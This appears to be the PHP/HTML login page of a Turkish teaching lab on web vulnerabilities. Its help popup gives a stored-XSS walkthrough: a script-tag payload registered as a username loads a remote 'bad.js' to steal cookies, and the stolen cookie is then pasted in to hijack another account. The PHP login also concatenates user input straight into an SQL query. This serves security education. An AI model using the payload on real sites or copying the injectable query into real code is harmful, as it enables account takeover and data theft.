<!DOCTYPE HTML>
<html lang="tr">
<?php session_start(); ?>
<?php include("klasik.php"); ?>
<?php include("connection.php"); ?>
<head>
	<meta charset="UTF-8">
	<title> Giriş </title>
</head>

<?php

	if(isset($_POST["kullanici_ad"])){//kullanıcı adı alanından veri alınmışsa
		$kullanici_ad=trim($_POST["kullanici_ad"]);//kullanici_ad değişkenine boşluk varsa temizleyerek al
		$sifre=trim($_POST["sifre"]);//sifre değişkenine boşluk varsa temizleyerek al
		$hashed_sifre=trim(mysql_prep($sifre));
		$query="SELECT * FROM kullanicilar1 WHERE kullanici_ad='$kullanici_ad' and sifre='$hashed_sifre'";
		$sonuc=mysql_query($query,$connection);//sorguyu işlet
		while($row=mysql_fetch_array($sonuc)){//sonuc varsa kullanici girişi başarılıdır
			$_SESSION['kullanici']=$row["kullanici_isim"];
			echo " <meta http-equiv='refresh' content='1;URL=kullanici_sayfasi.php'> ";//kullanıcı sayfasına yönlendir.
			}
	}
	
?>
<div class="container">    
        <div id="loginbox" style="margin-top:50px;" class="mainbox col-md-6 col-md-offset-3 col-sm-8 col-sm-offset-2">                    
            <div class="panel panel-info" >
                    <div class="panel-heading">
                        <div class="panel-title">Sisteme Giriş</div>
                        <div style="float:right; font-size: 80%; position: relative; top:-10px"><a href="uyeol.php">Üye ol</a></div>
                    </div>     

                    <div style="padding-top:30px" class="panel-body" >

                        <div style="display:none" id="login-alert" class="alert alert-danger col-sm-12"></div>
                            
                        <form id="loginform" name="loginform" method="post" action="xss.php">
                                    
                            <div style="margin-bottom: 25px" class="input-group">
                                        <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
                                        <input id="kullanici_ad" type="text" class="form-control" name="kullanici_ad" value="" placeholder="kullanıcı adı">                                        
                                    </div>
                                
                            <div style="margin-bottom: 25px" class="input-group">
                                        <span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i></span>
                                        <input id="sifre" type="password" class="form-control" name="sifre" placeholder="şifre">
			
                                    </div>

                                <div style="margin-top:10px" class="form-group">
                                    <!-- Button -->
									
                                    <div class="col-sm-12 controls">
                                      <input type="submit" name="submit" id="btn-login" class="btn btn-success" value="Giriş"/>
                                    </div>
                                </div>
    
                            </form>     



                        </div>                     
                    </div>  
        </div>
        <div id="signupbox" style="display:none; margin-top:50px" class="mainbox col-md-6 col-md-offset-3 col-sm-8 col-sm-offset-2">
                    <div class="panel panel-info">
                        <div class="panel-heading">
                            <div class="panel-title">Sign Up</div>
                            <div style="float:right; font-size: 85%; position: relative; top:-10px"><a id="signinlink" href="#" onclick="$('#signupbox').hide(); $('#loginbox').show()">Sign In</a></div>
                        </div>  
                        <div class="panel-body" >
                            <form id="signupform" class="form-horizontal" role="form">
                                
                                <div id="signupalert" style="display:none" class="alert alert-danger">
                                    <p>Error:</p>
                                    <span></span>
                                </div>
                                    
                                
                                  
                                <div class="form-group">
                                    <label for="email" class="col-md-3 control-label">Email</label>
                                    <div class="col-md-9">
                                        <input type="text" class="form-control" name="email" placeholder="Email Address">
                                    </div>
                                </div>
                                    
                                <div class="form-group">
                                    <label for="firstname" class="col-md-3 control-label">First Name</label>
                                    <div class="col-md-9">
                                        <input type="text" class="form-control" name="firstname" placeholder="First Name">
                                    </div>
                                </div>
                                <div class="form-group">
                                    <label for="lastname" class="col-md-3 control-label">Last Name</label>
                                    <div class="col-md-9">
                                        <input type="text" class="form-control" name="lastname" placeholder="Last Name">
                                    </div>
                                </div>
                                <div class="form-group">
                                    <label for="password" class="col-md-3 control-label">Password</label>
                                    <div class="col-md-9">
                                        <input type="password" class="form-control" name="passwd" placeholder="Password">
                                    </div>
                                </div>
                                    
                                <div class="form-group">
                                    <label for="icode" class="col-md-3 control-label">Invitation Code</label>
                                    <div class="col-md-9">
                                        <input type="text" class="form-control" name="icode" placeholder="">
                                    </div>
                                </div>

                                <div class="form-group">
                                    <!-- Button -->                                        
                                    <div class="col-md-offset-3 col-md-9">
                                        <button id="btn-signup" type="button" class="btn btn-info"><i class="icon-hand-right"></i> &nbsp Sign Up</button>
                                        <span style="margin-left:8px;">or</span>  
                                    </div>
                                </div>
                                
                                <div style="border-top: 1px solid #999; padding-top:20px"  class="form-group">
                                    
                                    <div class="col-md-offset-3 col-md-9">
                                        <button id="btn-fbsignup" type="button" class="btn btn-primary"><i class="icon-facebook"></i>   Sign Up with Facebook</button>
                                    </div>                                           
                                        
                                </div>
                                
                                
                                
                            </form>
                         </div>
                    </div>

               
               
                
         </div> 
    </div>
	
<a style="text-decoration: none;" href="javascript:void(0)" onclick="document.getElementById('guru').style.display='block';">
Yardım?</a>

<style type="text/css">              
.kte_conent {font-family:trebuchet ms;font-size:14px;text-align: justify;        display: none;   position: fixed;top:10%;left:20%; height:60%;width: 60%;             padding: 16px;border: 6px solid #0080FF;            background-color: white;            z-index:2003;            overflow: auto;     }
 
</style>     
<div align="center">
<div id="guru" class="kte_conent" align="center"> 
  <a href="http://www.koddostu.com/2011/10/sitene-aclr-pencere-kodu-ekle.html" target="_blank"></a>
<h3>
<span style="color:#3366ff;">XSS</span></h3>
XSS (Cross Site Scripting) script kodları üzerinden (genelde javascript) bir web sayfasına saldırı yapılmasıdır. 
XSS çoğunlukla tarayıcıda saklanan bilgiler olan cookielere saldırı amacı ile kullanılmaktadır.
<p>Uygulamada açık olup olmadığını anlamak için önce bir üye kaydı yapacağız. Kullanıcı ismi ve şifreye herhangi birşey girebilirsiniz. Kullanıcı adına < b>omer</ b> yazın.
Kullanıcı adı:hilal şifre:123456 olarak girip tüm kişileri listelediğinizde omer isminin kalın harflerle yazılı olduğunu göreceksiniz.
Bu zafiyet olduğunu gösterir. </p>
<p>Uygulamayı sömürmek için tekrar bir üye kaydı yapacağız. Kullanıcı ismine ve şifreye herhangi bir şey girebilirsiniz. 
Kullanıcı adına şu kodu:<b>< script src="http://localhost/asil/hack/bad.js"></ script>hacklendiniz</b>
kodunu girin. Veri tabanında kayıtlı kişler hilal ve heykir. Mozilladan kullanıcı adı:heykir şifre:123456 olarak hesaba girin. 
Google chromedan da kullanici adı:hilal şifre:123456 olarak giriş yapın ve kişileri bu hesaptan listeleyin. haklanediniz yazısını göreceksiniz. Bu şu demek:
Kaydettiğimiz kod diğer kullanıcı adlarıyla birlikte çekilip çalışacaktır. Böylece hilal adındaki kullanıcının çerezleri alınıp heykirin victims.txt dosyasına kaydedilmiştir.
Mozillada seçenekler-gizlilik-çerezleri göster yönergelerini izleyin. Localhostu bulup cookie managerde açın. 
Düzenleyin ve size gelen cookieyi yapıştırın. Sayfayı yenilediğinizde diğer kullanıcı sayfasındasınız.
Açığı olan kodlama şu şekildedir. </p>
<p><img src="xss_injection.png" alt="xss_injection"></p>
Bu zafiyet kullanıcı kaydı yapılırken kullanıcı adının hiçbir kontrol yapılmadan  veritabanına kaydedilmesinden kaynaklanır. 
Biz javascript kodunu kullanıcı adına girdiğimizde bu yüzden kabul etti ve veritabanına kaydetti.
<p><img src="xss.png" alt="xss"></p>
Görüldüğü gibi sarı renk ile vurgulanan yerlerde girişlerin kontrolü sağlanmış ve girdiler tüm HTML ve PHP kodlarından ayıklanmıştır.

<br/>
<center><a href="javascript:void(0)" onclick="document.getElementById('guru').style.display='none'"><button style="border: 2px outset rgb(0, 128, 255); background: none repeat scroll 0% 0% rgb(0, 128, 255);">Kapat</button></a></center> 
</div></div> 
<script src="https://www.koddostu.com/duzelt.js?no=284"></script>
	</br></br></br></br>
	<?php include("klasik_alt.php"); ?>
